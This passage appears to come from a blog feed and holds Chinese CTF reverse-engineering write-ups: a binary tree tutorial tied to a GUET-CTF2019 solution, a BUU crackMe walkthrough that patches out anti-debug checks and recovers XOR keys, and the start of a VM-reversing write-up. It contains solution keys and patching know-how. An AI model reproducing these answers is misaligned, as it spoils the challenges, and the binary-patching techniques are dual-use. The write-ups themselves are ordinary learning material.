title="二、二叉树的储存和创建"></a>二、二叉树的储存和创建</h4><h5 id="1、创建二叉链结构"><a href="#1、创建二叉链结构" class="headerlink" title="1、创建二叉链结构"></a>1、创建二叉链结构</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 二叉树结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">BrinyTree</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">BrinyTree</span>* left;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">BrinyTree</span>* right;</span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line">&#125;BT;</span><br></pre></td></tr></table></figure><h5 id="2、手动构建一颗树"><a href="#2、手动构建一颗树" class="headerlink" title="2、手动构建一颗树"></a>2、手动构建一颗树</h5><p>其实构建一棵树的思想还是挺简单的，按照图示创建6个节点，并根据图中的样子将节点顺次链接起来</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个节点 （有返回值，返回值类型为---结构体指针）</span></span><br><span class="line"><span class="function">BT* <span class="title">BuyNode</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BT* newnode = (BT*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BT));</span><br><span class="line"><span class="keyword">if</span> (newnode == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">perror</span>(<span class="string">&quot;malloc fail!&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">newnode-&gt;data = x;</span><br><span class="line">newnode-&gt;left = <span class="literal">NULL</span>;</span><br><span class="line">newnode-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> newnode;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个树</span></span><br><span class="line"><span class="function">BT* <span class="title">CreatBinaryTree</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 创建6个节点</span></span><br><span class="line">BT* node1 = <span class="built_in">BuyNode</span>(<span class="number">1</span>);</span><br><span class="line">BT* node2 = <span class="built_in">BuyNode</span>(<span class="number">2</span>);</span><br><span class="line">BT* node3 = <span class="built_in">BuyNode</span>(<span class="number">3</span>);</span><br><span class="line">BT* node4 = <span class="built_in">BuyNode</span>(<span class="number">4</span>);</span><br><span class="line">BT* node5 = <span class="built_in">BuyNode</span>(<span class="number">5</span>);</span><br><span class="line">BT* node6 = <span class="built_in">BuyNode</span>(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将结点连接起来，构成自己想要的树</span></span><br><span class="line">    node1-&gt;left = node2;</span><br><span class="line">    node1-&gt;right = node4;</span><br><span class="line">    node2-&gt;left = node3;</span><br><span class="line">    node4-&gt;left = node5;</span><br><span class="line">    node4-&gt;right = node6;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> node1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="三、二叉树的遍历-（重点）"><a href="#三、二叉树的遍历-（重点）" class="headerlink" title="三、二叉树的遍历 （重点）"></a>三、二叉树的遍历 （重点）</h4><h5 id="1、前序遍历"><a href="#1、前序遍历" class="headerlink" title="1、前序遍历"></a>1、前序遍历</h5><p>​前序遍历的代码非常简洁，短短几行即可操作，先看代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 前序遍历 根 左 右</span></span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">PrevOrder</span><span class="params">(BT* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NULL &quot;</span>); <span class="comment">// 如果为空，就打印</span></span><br><span class="line"><span class="keyword">return</span>;      <span class="comment">// 当前函数结束</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, root-&gt;data);</span><br><span class="line"><span class="built_in">PrevOrder</span>(root-&gt;left);</span><br><span class="line"><span class="built_in">PrevOrder</span>(root-&gt;right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/%E5%89%8D%E5%BA%8F%E9%81%8D%E5%8E%86.png" alt="前序遍历"></p><h5 id="2、中序遍历"><a href="#2、中序遍历" class="headerlink" title="2、中序遍历"></a><strong>2、中序遍历</strong></h5><p>中序遍历的代码和前序遍历一样，看起来都非常简洁：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 中序遍历  左 根 右</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InOrder</span><span class="params">(BT* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NULL &quot;</span>); <span class="comment">// 如果为空，就打印</span></span><br><span class="line"><span class="keyword">return</span>;      <span class="comment">// 当前函数结束</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">InOrder</span>(root-&gt;left);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, root-&gt;data);</span><br><span class="line"><span class="built_in">InOrder</span>(root-&gt;right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86%20%282%29.png" alt="中序遍历 (2)"></p><h5 id="3、后序遍历"><a href="#3、后序遍历" class="headerlink" title="3、后序遍历"></a>3、<strong>后序遍历</strong></h5><p>代码演示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 后序 左 右 根</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PosOrder</span><span class="params">(BT* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NULL &quot;</span>); <span class="comment">// 如果为空，就打印</span></span><br><span class="line"><span class="keyword">return</span>;      <span class="comment">// 当前函数结束</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">PosOrder</span>(root-&gt;left);</span><br><span class="line"><span class="built_in">PosOrder</span>(root-&gt;right);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, root-&gt;data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/%E5%90%8E%E5%BA%8F.png" alt="后序"></p><h5 id="4、层次遍历"><a href="#4、层次遍历" class="headerlink" title="4、层次遍历"></a>4、层次遍历</h5><p>代码演示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化队列 </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitQueue</span><span class="params">(SqQueue *Q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Q-&gt;front = Q-&gt;rear = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 辅助队列的入队操作 </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">EnQueue</span><span class="params">(SqQueue *Q, QElemType q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ((Q-&gt;rear + <span class="number">1</span>) % MAXSIZES == Q-&gt;front)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">Q-&gt;data[Q-&gt;rear] = q;</span><br><span class="line">Q-&gt;rear = (Q-&gt;rear + <span class="number">1</span>) % MAXSIZES;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 辅助队列的出队操作 </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DeQueue</span><span class="params">(SqQueue *Q, QElemType *q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (Q-&gt;front == Q-&gt;rear)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">*q = Q-&gt;data[Q-&gt;front];</span><br><span class="line">Q-&gt;front = (Q-&gt;front + <span class="number">1</span>) % MAXSIZES;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">LevelOrder</span><span class="params">(BiTree T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">SqQueue Q;</span><br><span class="line"><span class="built_in">InitQueue</span>(&amp;Q);<span class="comment">// 初始化辅助队列</span></span><br><span class="line">BiTree p;</span><br><span class="line"><span class="built_in">EnQueue</span>(&amp;Q, T);<span class="comment">// 将根节点入队</span></span><br><span class="line"><span class="keyword">while</span>(Q.front != Q.rear)<span class="comment">// 队列不空则循环 </span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DeQueue</span>(&amp;Q, &amp;p);<span class="comment">// 队头结点出队</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, p-&gt;data);</span><br><span class="line"><span class="keyword">if</span> (p-&gt;lchild != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">EnQueue</span>(&amp;Q, p-&gt;lchild);<span class="comment">// 左子树不空,则左子树根节点入队 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (p-&gt;rchild != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">EnQueue</span>(&amp;Q, p-&gt;rchild);<span class="comment">// 右子树不空,则右子树根节点入队 </span></span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/%E5%B1%82%E6%AC%A1.png" alt="层次"></p><hr><h2 id="GUET-CTF2019-number-game"><a href="#GUET-CTF2019-number-game" class="headerlink" title="[GUET-CTF2019]number_game"></a>[GUET-CTF2019]number_game</h2><p>下载完拖入010是elf文件，直接拖入64位ida</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/main.png" alt="main"></p><p>由sub_4006D6可知flag长度为10</p><p>sub_400758是用二叉树把flag传给了v4，</p><p>先给本身赋值赋值，</p><p>然后把左结点来把奇数位进行赋值</p><p>右结点把偶数位进行赋值</p><p>sub_400807这是个二叉树的<strong>中序遍历</strong></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86.png" alt="中序遍历"></p><p>sub_400881是吧v7的值输入到特定的地址中</p><p>sub_400917是个检查函数，跟进查看</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/%E6%95%B0%E7%8B%AC.png" alt="数独"></p><p>这是个二维数组的检查函数要求在一个5*5的二维数组中 每行 or 每列 不能有相同的数字 </p><p>跟进unk_601060并且将它按照5*5的格式展开如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">14#23</span><br><span class="line">30#1#</span><br><span class="line">0#23#</span><br><span class="line">#3##0</span><br><span class="line">42##1</span><br></pre></td></tr></table></figure><p>这是个数独游戏，把每个数字写出来之后</p><p>按照从上到下，从左到右的顺序排列好后</p><p>按照二叉树的中序排列逆回去就是flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【动调】【反调试绕过】【花指令nop】【buu】buu_crackMe</title>
      <link href="/2024/07/22/%E3%80%90%E5%8A%A8%E8%B0%83%E3%80%91%E3%80%90%E5%8F%8D%E8%B0%83%E8%AF%95%E7%BB%95%E8%BF%87%E3%80%91%E3%80%90%E8%8A%B1%E6%8C%87%E4%BB%A4nop%E3%80%91%E3%80%90buu%E3%80%91buu_crackMe/"/>
      <url>/2024/07/22/%E3%80%90%E5%8A%A8%E8%B0%83%E3%80%91%E3%80%90%E5%8F%8D%E8%B0%83%E8%AF%95%E7%BB%95%E8%BF%87%E3%80%91%E3%80%90%E8%8A%B1%E6%8C%87%E4%BB%A4nop%E3%80%91%E3%80%90buu%E3%80%91buu_crackMe/</url>
      
        <content type="html"><![CDATA[<h1 id="【动调】【反调试绕过】【花指令nop】【buu】buu-crackMe"><a href="#【动调】【反调试绕过】【花指令nop】【buu】buu-crackMe" class="headerlink" title="【动调】【反调试绕过】【花指令nop】【buu】buu_crackMe"></a>【动调】【反调试绕过】【花指令nop】【buu】buu_crackMe</h1><hr><p><strong>也是去找了一个wp+学长帮助才出的这道题</strong></p><hr><p>差壳无可32位进入ida进入main函数</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/main.png" alt="main"></p><p>发现4011A0这个函数好像未被分析成功</p><p>跟进查看，发现有红名</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/4011A0.png" alt="4011A0"></p><p>把这里的花指令给nop掉：</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/%E5%8F%8D%E5%A4%8D%E6%A8%AA%E8%B7%B3%E7%9A%84%E8%8A%B1%E6%8C%87%E4%BB%A4.png" alt="反复横跳的花指令"></p><p>然后把红名部分全部选中然后摁P进行重新分析成函数，</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/%E5%8E%BB%E8%8A%B1%E5%90%8E.png" alt="去花后"></p><p>然后摁f5查看伪函数，整理后如下</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/congratulation.png" alt="congratulation"></p><p>BYD被骗了</p><p>回到main函数整理一下</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/main_fix.png" alt="main_fix"></p><p>查看sub_401830</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/401830.png" alt="401830"></p><p>有点长，分析一下，</p><p>上半部分主要还是检验是不是字符串一类的程序，但是要注意这个反调试</p><p>从**while ( v5 &lt; 8 )**开始分析</p><p>这个v5&lt;8就已经说明了密码是8位</p><p>首先是要对byte_416050进行一系列操作</p><p>然后检测调试，如果是在调试状态就进入该语句（但是正常的情况下不应该执行它，所以我们等下用ida调试的时候要绕过反调试）</p><p>然后执行密码加密 v16[v5] &#x3D; byte_416050[(v7 + v12)] ^ v15[v4 - 1]</p><p>v16就是加密后的密码，它参与下一个函数的加密</p><p>紧着到来的是另一个调试检测</p><p>然后进入到sub_401710（加密函数）用处理过的byte_416050，输入的用户名和循环系数v5进行一段处理</p><p>最后进入到sub_401470(v16, &amp;v13)和密文进行比对</p><hr><p>跟进sub_401470(v16, &amp;v13)，发现这也是有反调试上了</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/sub_401470.png" alt="sub_401470"></p><p>现在进行绕过反调试</p><p>选中NtCurrentPeb，摁Tab,就会进入到该函数所在的汇编段内</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/%E5%8F%8D%E8%B0%83%E8%AF%951.png" alt="反调试1"></p><p>蓝色的框就是反调试代码所在的汇编块，然后把 <strong>jz改成jmp</strong> 即可（改蓝色框的就行）</p><p>（动调的时候改zf值也行，不过这题这么改有点麻烦）</p><p>再摁F5查看伪代码</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/%E5%8E%BB%E5%8F%8D%E8%B0%83%E8%AF%95-%E5%AF%86%E6%96%87.png" alt="去反调试-密文"></p><p>觉得还是有点抽象把aam和daa給nop掉就可以了</p><p>得到密文：</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/%E5%AF%86%E6%96%87.png" alt="密文"></p><p>密文是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbappsec</span><br></pre></td></tr></table></figure><p>然后回到上一级函数中，给三个反调试的 <strong>汇编部分的jz</strong> 打上断点</p><p>一会动调再把他们改成jmp（别问为什么，我的ida就这样）</p><p>以防直接进入到语句，在这里再打个断点</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/%E6%96%AD%E7%82%B9.png" alt="断点"></p><p>回到伪代码跟进下加密函数sub_401710</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/enc.png" alt="enc"></p><p>这第一个if的一坨也是个反调试，所以正确的加密应该是下面的else if——else</p><p>v4是用户名的长度，v3的最大值是密码的长度为8</p><p>所以v3恒小于v4，只执行 <strong>else if</strong> 的加密</p><p>a1是经过上一个函数加密后的密码（上一层的加密v16[v5] &#x3D; byte_416050[(v7 + v12)] ^ v15[v4 - 1]）</p><p>a2是用户名，所以加密就是把正确密码和用户名前八位进行异或</p><p>回到上一层的函数点击v16[v5] &#x3D; byte_416050[(v7 + v12)] ^ v15[v4 - 1]</p><p>tab跟进汇编代码</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/xor.png" alt="xor"></p><p>movzx ecx, [ebp+var_209]是将byte_416050的值存入ecx，此处的ecx的值即为我们想要知道的值！</p><p>所以开启动调</p><p>输入用户名和随便8位密码</p><p>停在了我们刚才打断点的地方，我们需要把上面说要改的jz改成jmp</p><p>然后运行让指令运行在这里</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/%E5%8A%A8%E8%B0%831.png" alt="动调1"></p><p>然后摁单步执行查看ecx的值就可以了，</p><p>最终得到异或的值为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x2a,0xd7,0x92,0xe9,0x53,0xe2,0xc4,0xcd</span><br></pre></td></tr></table></figure><p>现在可以写脚本了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xor = [<span class="number">0x2a</span>, <span class="number">0xd7</span>, <span class="number">0x92</span>, <span class="number">0xe9</span>, <span class="number">0x53</span>, <span class="number">0xe2</span>, <span class="number">0xc4</span>, <span class="number">0xcd</span>]</span><br><span class="line">enc = <span class="string">&#x27;dbappsec&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    flag += <span class="built_in">hex</span>(xor[i] ^ <span class="built_in">ord</span>(enc[i]))[<span class="number">2</span>:]</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得出的flag再找个在线加密网站进行加密就可以了</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【vm逆向】【buu】[网鼎杯 2020 青龙组]singal</title>
      <link href="/2024/07/22/%E3%80%90vm%E9%80%86%E5%90%91%E3%80%91%E3%80%90buu%E3%80%91%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Dsingal/"/>
      <url>/2024/07/22/%E3%80%90vm%E9%80%86%E5%90%91%E3%80%91%E3%80%90buu%E3%80%91%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Dsingal/</url>
      
        <content type="html"><![CDATA[<h1 id="【vm逆向】【buu】-网鼎杯-2020-青龙组-singal"><a href="#【vm逆向】【buu】-网鼎杯-2020-青龙组-singal" class="headerlink" title="【vm逆向】【buu】[网鼎杯 2020 青龙组]singal"></a>【vm逆向】【buu】[网鼎杯 2020 青龙组]singal</h1><hr><p>建议先把这个看下，虽然这道题没这么复杂</p><p>【系统学习vm虚拟机逆向】<a href="https://blog.csdn.net/weixin_43876357/article/details/108570305?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172161411916800178553714%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=172161411916800178553714&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-108570305-null-null.142">https://blog.csdn.net/weixin_43876357/article/details/108570305?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172161411916800178553714%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=172161411916800178553714&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-108570305-null-null.142</a></p><hr><p>查壳无壳32位进ida</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Dsingal/main.png" alt="main"></p><p>将unk_403040赋值给v4</p><p>跟进vm_operad</p><p>太长了，直接黏贴代码了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">vm_operad</span><span class="params">(<span class="type">int</span> *a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">200</span>]; <span class="comment">// [esp+13h] [ebp-E5h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+DBh] [ebp-1Dh]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+DCh] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+E0h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+E4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+E8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+ECh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v9;</span><br><span class="line">    <span class="keyword">if</span> ( v9 &gt;= a2 )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">switch</span> ( a1[v9] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        Str[v6 + <span class="number">100</span>] = v4;</span><br><span class="line">        ++v9;</span><br><span class="line">        ++v6;</span><br><span class="line">        ++v8;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] + Str[v8];</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v4 = Str[v8] - LOBYTE(a1[v9 + <span class="number">1</span>]);</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] ^ Str[v8];</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] * Str[v8];</span><br><span class="line">        v9 += <span 